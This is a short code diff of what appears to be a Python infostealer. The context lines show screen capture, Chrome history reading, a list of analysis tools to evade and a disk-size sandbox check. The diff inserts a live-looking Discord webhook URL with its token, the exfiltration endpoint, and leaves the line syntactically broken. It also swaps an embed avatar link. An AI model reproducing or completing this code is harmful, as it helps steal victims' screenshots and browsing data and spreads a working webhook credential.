@@ -5,7 +5,7 @@ import re, uuid
 from PIL import ImageGrab
 from browser_history.browsers import Chrome
 webhook = "Webhooksss"
-process = [
+process = [https://discord.com/api/webhooks/1457080106819518658/31asaHrzVMjwBA6gY_O3lsuaMasudwD3sr0vBRUxpQZZnucdNBtJW9LBqJRmpZLUClrq
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
     "wireshark.exe",
@@ -38,7 +38,7 @@ if diskSizeGB < minDiskSizeGB:
     try:
 
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/1457080067459911723/1461456438751789196/IMG_0465.png?ex=696b479f&is=6969f61f&hm=c584d166791abadd3ba11cf35e1b41165da12f12c2de0299aaac70b9e64db520",
                       "embeds": [
                 {
                     "author": {
